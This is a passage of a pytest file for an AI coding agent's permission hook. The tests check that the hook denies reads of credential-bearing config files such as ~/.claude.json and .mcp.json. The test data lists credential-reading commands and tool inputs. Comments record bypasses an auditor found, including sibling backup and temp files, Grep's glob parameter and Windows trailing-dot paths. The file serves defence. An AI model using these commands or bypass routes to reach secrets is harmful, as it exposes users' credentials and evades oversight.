            behavior, _ = decide("Bash", {"command": cmd})
            assert behavior != "deny", f"false-positive deny on prose mention: {cmd!r}"

    def test_cat_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        # Credential Non-Possession P1.1 (2026-09-12): the Bash-side half of
        # the same gap TestMcpSecretConfigReadDenied covers for Read/Grep/
        # Glob -- `cat ~/.claude.json` previously returned ("allow", "")
        # because no SENSITIVE_PATH_PATTERNS entry matched this filename.
        self._assert_denied(monkeypatch, capsys, "cat ~/.claude.json")

    def test_cat_dotmcp_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "cat .mcp.json")

    def test_cp_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        # P1.1 v2 design review (2026-09-12, skeptic-found, confirmed live
        # before fixing): `cp ~/.claude.json /tmp/x` (then an unguarded
        # `Read` of the copy) previously returned ("ask", "") -- effectively
        # "allow" on this solo-autonomy profile -- because `_names_a_
        # sensitive_path()`'s own docstring had already NAMED this class of
        # alternate reader as a known, accepted gap, but a design review
        # specifically asking "can model-accessible paths recover the
        # credential" is exactly the moment to close named instances of it.
        self._assert_denied(monkeypatch, capsys, "cp ~/.claude.json /tmp/x")

    def test_sed_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "sed -n '1,5p' ~/.claude.json")

    def test_xxd_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "xxd ~/.claude.json")

    def test_strings_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "strings ~/.claude.json")

    def test_less_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "less ~/.claude.json")

    def test_more_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "more ~/.claude.json")

    def test_od_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "od ~/.claude.json")

    def test_hexdump_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "hexdump ~/.claude.json")

    def test_type_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(monkeypatch, capsys, "type C:\\Users\\serge\\.claude.json")

    def test_findstr_claude_json_escalated_to_deny(self, monkeypatch, capsys):
        self._assert_denied(
            monkeypatch, capsys, "findstr /s API_KEY C:\\Users\\serge\\.claude.json"
        )

    def test_ordinary_cp_not_escalated(self, monkeypatch, capsys):
        # Regression guard: this new prefix must not affect the overwhelming
        # majority of `cp` calls that have nothing to do with sensitive paths.
        behavior, _ = decide("Bash", {"command": "cp README.md /tmp/x"})
        assert behavior != "deny"


class TestMcpSecretConfigReadDenied:
    """Credential Non-Possession P1.1 (2026-09-12): Read/Grep/Glob on
    Claude Code's own MCP config files (and other SENSITIVE_PATH_PATTERNS-
    shaped paths) disclose plaintext credentials in one call -- found live
    when a single Grep against ~/.claude.json recovered a real MCP server's
    credential. First cut of the fix used exact-basename matching against a
    narrow list; sec-auditor's adversarial review of the fix itself (same
    night, before merge) demonstrated two live bypasses against files that
    exist on the reviewer's own machine right now (`.claude.json.backup`,
    `.claude.json.tmp.<pid>.<hash>`, both real Claude-Code-created files
    with the same secret content) plus a full bypass via Grep's `glob`
    parameter and Glob's `pattern` parameter, neither of which the first
    cut inspected at all. This class covers the corrected, substring-based,
    multi-field design. See docs/credential-broker-pilot-threat-model.md's
    "VERDICT: REJECTED before execution" section and its sec-auditor
    follow-up for the full incident."""

    def test_read_claude_json_denied(self):
        behavior, _ = decide("Read", {"file_path": "/home/user/.claude.json"})
        assert behavior == "deny"

    def test_read_claude_json_windows_path_denied(self):
        behavior, _ = decide("Read", {"file_path": "C:\\Users\\serge\\.claude.json"})
        assert behavior == "deny"

    def test_read_claude_desktop_config_denied(self):
        behavior, _ = decide("Read", {"file_path": "/home/user/Library/claude_desktop_config.json"})
        assert behavior == "deny"

    def test_read_dotmcp_json_denied(self):
        behavior, _ = decide("Read", {"file_path": "/repo/.mcp.json"})
        assert behavior == "deny"

    def test_read_bare_mcp_json_denied(self):
        behavior, _ = decide("Read", {"file_path": "/repo/mcp.json"})
        assert behavior == "deny"

    def test_grep_path_targeting_claude_json_denied(self):
        behavior, _ = decide("Grep", {"pattern": "OBSIDIAN", "path": "/home/user/.claude.json"})
        assert behavior == "deny"

    def test_glob_path_targeting_claude_json_denied(self):
        behavior, _ = decide("Glob", {"pattern": "*", "path": "/home/user/.claude.json"})
        assert behavior == "deny"

    def test_case_insensitive_match(self):
        behavior, _ = decide("Read", {"file_path": "/home/user/.CLAUDE.JSON"})
        assert behavior == "deny"

    def test_ordinary_read_still_allowed(self):
        # Regression guard: this new check must not affect the overwhelming
        # majority of Read calls that have nothing to do with MCP config.
        assert decide("Read", {"file_path": "/repo/hooks/permission_policy.py"}) == (
            "allow",
            "",
        )

    def test_read_unrelated_similarly_worded_file_not_denied(self):
        # WHY this test exists: a substring scan must not false-positive on
        # a name that merely shares a WORD with a sensitive pattern but
        # doesn't contain the actual sensitive substring -- "not_claude.json
        # _really" contains "claude" and "json" separately but never the
        # literal substring ".claude.json" (no dot immediately before
        # "claude"). This is the accepted-precision floor, not a claim that
        # EVERY superficially similar name is safe (see the sibling-file
        # tests below, which are DELIBERATELY denied).
        assert decide("Read", {"file_path": "/repo/not_claude.json_really"}) == (
            "allow",
            "",
        )

    def test_read_sibling_backup_file_denied(self):
        # CRITICAL-1 (sec-auditor-found, 2026-09-12, reproduced against real
        # files on the reviewer's own machine): Claude Code itself creates
        # `.claude.json.backup`-style sibling files carrying the SAME
        # mcpServers.*.env content. Exact-basename matching (the first cut)
        # missed these entirely -- a substring scan catches them because
        # ".claude.json" is a literal substring of the sibling's name.
        behavior, _ = decide("Read", {"file_path": "/home/user/.claude.json.backup"})
        assert behavior == "deny"

    def test_read_sibling_tmp_file_denied(self):
        # CRITICAL-1, second reproduction: Claude Code's own atomic-write
        # pattern creates `.claude.json.tmp.<pid>.<hash>` files with
        # near-identical content to the real config, before renaming over
        # it. These are real, transient, but real.
        behavior, _ = decide(
            "Read", {"file_path": "/home/user/.claude.json.tmp.31036.d883b563e733"}
        )
        assert behavior == "deny"

    def test_read_my_mcp_json_bak_now_denied(self):
        # Accepted false-positive tradeoff (same class as `.env.example`
        # under the Bash-side SENSITIVE_PATH_PATTERNS list, now consistent
        # between the Bash and Read/Grep/Glob halves of this mechanism --
        # sec-auditor's MEDIUM-5 finding was exactly this inconsistency
        # between the two halves before this fix unified them onto one
        # substring-based list).
        behavior, _ = decide("Read", {"file_path": "/repo/my_mcp.json.bak"})
        assert behavior == "deny"

    def test_grep_glob_param_targeting_claude_json_denied(self):
        # CRITICAL-2 (sec-auditor-found, 2026-09-12, reproduced live):
        # Grep's own `glob` parameter names the target file just as
        # precisely as `path` -- checking only `path` (the first cut) let
        # `Grep(pattern="X", path=".", glob=".claude.json")` return the
        # file's matching CONTENT with zero gate.
        behavior, _ = decide(
            "Grep",
            {"pattern": "API_KEY", "path": "/home/user", "glob": ".claude.json"},
        )
        assert behavior == "deny"

    def test_glob_pattern_param_targeting_claude_json_denied(self):
        # CRITICAL-2, second half: Glob's `pattern` parameter (e.g.
        # "**/.claude.json") is the actual file-matching glob, unlike
        # Grep's `pattern` (search content) -- must be checked for Glob
        # specifically, not skipped the way Grep's `pattern` correctly is.
        behavior, _ = decide("Glob", {"pattern": "**/.claude.json"})
        assert behavior == "deny"

    def test_grep_pattern_param_not_treated_as_a_path(self):
        # WHY: Grep's `pattern` is SEARCH CONTENT, not a path -- searching
        # source code for the literal word "credentials" must not itself
        # trigger a false deny just because the word appears in
        # SENSITIVE_PATH_PATTERNS. Only `path` and `glob` are path-shaped
        # for Grep.
        behavior, _ = decide("Grep", {"pattern": "credentials", "path": "/repo/hooks"})
        assert behavior == "allow"

    def test_trailing_whitespace_does_not_evade_the_check(self):
        # MEDIUM-4 (sec-auditor-found, 2026-09-12): Windows silently drops a
        # trailing space or dot when actually resolving a path --
        # ".claude.json " and ".claude.json." both open the real file on
        # disk. This was a real bypass under the FIRST cut's EXACT-basename
        # design (an unmatched trailing character defeated equality). Under
        # the current substring-containment design this property holds
        # automatically, with no dedicated strip() needed -- extra trailing
        # characters cannot remove a substring match already present in the
        # shorter prefix. Kept as a named regression test because the
        # PROPERTY (this bypass shape stays closed) matters regardless of
        # which mechanism currently provides it.
        behavior, _ = decide("Read", {"file_path": "C:/Users/serge/.claude.json "})
        assert behavior == "deny"
        behavior, _ = decide("Read", {"file_path": "C:/Users/serge/.claude.json."})
        assert behavior == "deny"

    def test_grep_without_explicit_path_or_glob_not_denied(self):
        # Known, accepted, NOT closed by this check (see
        # _targets_sensitive_config_read's own docstring): a Grep/Glob call
        # with no path/glob/pattern naming a specific file, or a path that
        # is a DIRECTORY merely containing one of these files, is not
        # caught here. Asserted explicitly so a future change to this
        # behavior is a deliberate decision, not a silent regression
        # either way.
        assert decide("Grep", {"pattern": "OBSIDIAN_API_KEY"}) == ("allow", "")

    def test_empty_tool_input_not_denied(self):
        assert decide("Read", {}) == ("allow", "")
        assert decide("Grep", {}) == ("allow", "")
        assert decide("Glob", {}) == ("allow", "")

    def test_other_tools_unaffected(self):
        # _targets_sensitive_config_read only applies to Read/Grep/Glob --
        # a Bash command that merely mentions these filenames in prose
        # (no chain operator, no sensitive-path-read prefix) must not be
        # caught by THIS mechanism specifically.
        behavior, _ = decide("Bash", {"command": 'echo "see .claude.json for config"'})
        assert behavior != "deny"

    def test_main_emits_deny_for_read_of_claude_json(self, monkeypatch, capsys):
        monkeypatch.setattr(
            "sys.stdin",
            io.StringIO(
                json.dumps(
                    {
                        "tool_name": "Read",
                        "tool_input": {"file_path": "/home/user/.claude.json"},
                    }
                )
            ),
        )
        try:
            main()
        except SystemExit:
            pass
        out = capsys.readouterr().out.strip()
        assert out != ""
        decision = json.loads(out)["hookSpecificOutput"]
        assert decision["permissionDecision"] == "deny"
